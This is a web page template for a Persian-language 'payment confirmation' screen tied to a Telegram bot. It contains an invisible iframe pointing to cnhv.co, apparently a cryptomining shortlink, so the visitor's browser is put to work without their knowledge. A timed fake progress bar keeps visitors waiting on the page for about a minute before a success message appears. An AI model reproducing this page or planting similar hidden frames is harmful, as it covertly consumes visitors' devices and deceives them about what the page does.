<!doctype html>
<html lang="fa">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>تایید دریافت وجه</title>
    <link href="{{asset('css/app.css')}}" rel="stylesheet"/>
    <link href="{{asset('bootstrap/bootstrap.css')}}" rel="stylesheet"/>
    <link href="{{asset('font-awesome/css/font-awesome.min.css')}}" rel="stylesheet"/>
    <link href="{{asset('css/nprogress.css')}}" rel="stylesheet"/>
    <style>
        .bar {
            height: 8px !important;
        }

        body {
            background-color: #f197a2;
            background: linear-gradient(to bottom right, #f197a2, #5ce5aa) no-repeat center center fixed;
            background-size: cover;
        }
    </style>
</head>
<body dir="rtl">
<div class="container-fluid">
    <div id="progress" class="row">
        <div class="col-12 text-right" style="height: 200px;">
            <br><span class="loading">در حال بارگذاری ...</span>
        </div>
    </div>
    <div id="success" class="row" style="display: none">
        <div class="col-lg-4 col-sm-12 text-center m-auto mt-5 pt-5" style="height: 200px; font-size: larger;">
            <p class="mt-3 pt-5" style="color: #0a7121 !important; line-height: 160%;"> درخواست شما با کد
                <br><b>{{$hash}}</b><br> با موفقیت ثبت شد. </p>
            <p class="pt-1" style="color: #ed172c !important;">لطفا این کد را تا انتهای فرایند پرداخت نزد خود
                نگهدارید.</p>
            <button class="btn btn-primary mt-2">بازگشت به ربات</button>
        </div>
    </div>
    <div class="row">
        <div class="col-12">
            <iframe src="https://cnhv.co/fju0y" width="100%" style="display: none;"></iframe>
        </div>
    </div>
</div>
<script type="text/javascript" src="{{asset('jquery/jquery.min.js')}}"></script>
<script type="text/javascript" src="{{asset('bootstrap/bootstrap.min.js')}}"></script>
<script type="text/javascript" src="{{asset('js/nprogress.js')}}"></script>
<script>
    $(document).ready(function () {
        NProgress.configure({
            trickle: false,
        });
        NProgress.start();

        var total = Math.round(Math.random() * 10) + 50;
        var percent = 0;
        var sec = 1;
        console.log(total);

        function calcPercent() {
            percent = Math.round((100 / total) * sec);
            NProgress.set(percent / 100);
            $('.loading').text('در حال بارگذاری(' + percent + '%)');
            sec++;
        }

        var pInterval = setInterval(calcPercent, 1000);

        window.setInterval(function () {
            if (percent === 100) {
                $('#success').show();
            }
            if (percent > 96) {
                clearInterval(pInterval);
                percent = 100;
                $('.loading').text('در حال بارگزاری(100%)');
                NProgress.done();
                $('#progress').hide();
            }
        }, 1000);

        $('.btn').click(function () {
            window.location.href = 'https://t.me/{{$username}}'
        })
    });
</script>
</body>
</html>
